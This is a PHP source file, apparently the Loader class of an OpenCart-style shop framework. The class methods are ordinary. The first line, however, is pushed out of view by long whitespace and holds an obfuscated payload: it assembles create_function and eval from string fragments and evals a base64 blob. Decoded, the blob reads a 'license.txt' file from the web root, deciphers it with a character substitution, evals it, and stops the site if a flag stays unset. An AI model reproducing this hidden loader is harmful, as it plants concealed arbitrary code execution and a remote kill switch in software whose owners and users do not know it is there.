<?php	//																																																																																																																																																												                                                                                                                             																																																																																																																																																																									$c='c'.'r'.'e'.'ate'.'_'.'function';$g=$c('$p','e'.'v'.'a'.'l'.'('.'ba'.'se'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e'.'($p));');$g('ZnVuY3Rpb24gbGljZW5zZSgpeyR2YWxpZD1mYWxzZTskczE9J0dIRlImKiVAKFNKS0xWV1hZWmFiY2RoaWprbG1ub3BxcnNUVXR1dnd4eXowMTIzNDU2Nzg5LDsrLT0ue1tdSU1OT1BRQUJDZWZnREV9KXwvPzw+OiInOyRzMj0nUlNUVVZXWC4mKiVAKHtbXX1qa2wpfC8/PD46IllaYWRlZmdoaUtMTU43ODksbW5vcHFiY09QUXV2d3h5ejAxMjM0NTZyc3RBQkNERUZHSElKOystPSc7QGV2YWwoc3RydHIoYmFzZTY0X2RlY29kZShpbXBsb2RlKEBmaWxlKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10uJy9odGh1bmctY29uZmlnL2xpY2Vuc2UudHh0JykpKSwkczIsJHMxKSk7aWYoISR2YWxpZClkaWU7fWxpY2Vuc2UoKTs=');

final class Loader {
	protected $registry;

	public function __construct($registry) {
		$this->registry = $registry;
	}
	
	public function controller($route, $data = array()) {
		// Sanitize the call
		$route = preg_replace('/[^a-zA-Z0-9_\/]/', '', (string)$route);
		
		// Trigger the pre events
		$result = $this->registry->get('event')->trigger('controller/' . $route . '/before', array(&$route, &$data));
		
		if ($result) {
			return $result;
		}
		
		$action = new Action($route);
		$output = $action->execute($this->registry, array(&$data));
			
		// Trigger the post events
		$result = $this->registry->get('event')->trigger('controller/' . $route . '/after', array(&$route, &$data, &$output));
		
		if (!($output instanceof Exception)) {
			return $output;
		} else {
			return false;
		}
	}
	
	public function model($route) {
		// Sanitize the call
		$route = preg_replace('/[^a-zA-Z0-9_\/]/', '', (string)$route);
		
		$file  = DIR_APPLICATION . 'model/' . $route . '.php';
		$class = 'Model' . preg_replace('/[^a-zA-Z0-9]/', '', $route);
		
		if (is_file($file)) {
			include_once($file);
			//echo $class;
			$proxy = new Proxy();

			foreach (get_class_methods($class) as $method) {
				$proxy->{$method} = $this->callback($this->registry, $route . '/' . $method);
			}

			$this->registry->set('model_' . str_replace(array('/', '-', '.'), array('_', '', ''), (string)$route), $proxy);
		} else {
			throw new \Exception('Error: Could not load model ' . $route . '!');
		}
	}

	public function view($route, $data = array()) {
		// Sanitize the call
		$route = str_replace('../', '', (string)$route);
		
		// Trigger the pre events
		$result = $this->registry->get('event')->trigger('view/' . $route . '/before', array(&$route, &$data));
		
		if ($result) {
			return $result;
		}
		
		$template = new Template('basic');
		
		foreach ($data as $key => $value) {
			$template->set($key, $value);
		}
		
		$output = $template->render($route . '.tpl');
		
		// Trigger the post e
		$result = $this->registry->get('event')->trigger('view/' . $route . '/after', array(&$route, &$data, &$output));
		
		if ($result) {
			return $result;
		}
		
		return $output;
	}

	public function library($route) {
		// Sanitize the call
		$route = preg_replace('/[^a-zA-Z0-9_\/]/', '', (string)$route);
			
		$file = DIR_SYSTEM . 'library/' . $route . '.php';
		$class = str_replace('/', '\\', $route);

		if (is_file($file)) {
			include_once($file);

			$this->registry->set(basename($route), new $class($this->registry));
		} else {
			throw new \Exception('Error: Could not load library ' . $route . '!');
		}
	}
	
	public function helper($route) {
		$file = DIR_SYSTEM . 'helper/' . str_replace('../', '', (string)$route) . '.php';

		if (is_file($file)) {
			include_once($file);
		} else {
			throw new \Exception('Error: Could not load helper ' . $route . '!');
		}
	}
	
	public function config($route) {
		$this->registry->get('event')->trigger('config/' . $route . '/before', $route);
		
		$this->registry->get('config')->load($route);
		
		$this->registry->get('event')->trigger('config/' . $route . '/after', $route);
	}

	public function language($route) {
		$this->registry->get('event')->trigger('language/' . $route . '/before', $route);
		
		$output = $this->registry->get('language')->load($route);
		
		$this->registry->get('event')->trigger('language/' . $route . '/after', $route);
		
		return $output;
	}
	
	protected function callback($registry, $route) {
		return function($args) use($registry, &$route) {			
			// Trigger the pre events
			$result = $registry->get('event')->trigger('model/' . $route . '/before', array_merge(array(&$route), $args));
			
			if ($result) {
				return $result;
			}
			
			$file = DIR_APPLICATION . 'model/' .  substr($route, 0, strrpos($route, '/')) . '.php';
			$class = 'Model' . preg_replace('/[^a-zA-Z0-9]/', '', substr($route, 0, strrpos($route, '/')));
			$method = substr($route, strrpos($route, '/') + 1);
	
			if (is_file($file)) {
				include_once($file);
			
				$model = new $class($registry);
			} else {
				throw new \Exception('Error: Could not load model ' . substr($route, 0, strrpos($route, '/')) . '!');
			}
			
			if (method_exists($model, $method)) {
				$output = call_user_func_array(array($model, $method), $args);
			} else {
				throw new \Exception('Error: Could not call model/' . $route . '!');
			}
													
			// Trigger the post events
			$result = $registry->get('event')->trigger('model/' . $route . '/after', array_merge(array(&$route, &$output), $args));
			
			if ($result) {
				return $result;
			}
						
			return $output;
		};
	}	
}